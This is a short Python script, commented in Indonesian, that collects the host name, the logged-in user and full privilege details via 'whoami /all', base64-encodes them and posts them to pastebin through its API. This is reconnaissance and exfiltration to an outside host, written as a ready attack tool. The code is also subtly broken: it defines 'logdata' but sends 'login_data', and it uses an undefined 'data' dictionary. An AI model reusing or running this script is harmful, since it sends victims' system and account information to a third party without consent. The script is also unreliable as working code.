import base64
import requests
from subprocess import PIPE,Popen


cmd = ""
cmd += "Host name : "
process = Popen("hostname", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
output, error = process.communicate()
cmd += output.decode()

# Mengeksekusi command "whoami" yang akan mengirimkan data
cmd += "Logged in user : "
process = Popen("whoami", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
output, error = process.communicate()
cmd += output.decode()

# Mengeksekusi command "whoami /all" yang akan mengirimkan data
cmd += "Permissions :  "
process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
output, error = process.communicate()
cmd += output.decode()

print(cmd)

print("Encoded result: ")
encoded_result = base64.b64encode(cmd.encode())
print(encoded_result)
text = encoded_result

logdata = {
    'devkey': '',
    'username': '',
    'password': ''
    }
 
login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
print("Login status: ", login.status_code if login.status_code != 200 else "OK/200")
print("User token: ", login.text)
data['userkey'] = login.text
 
r = requests.post("https://pastebin.com/api/api_post.php", data=data)
print("Paste URL: ", r.text)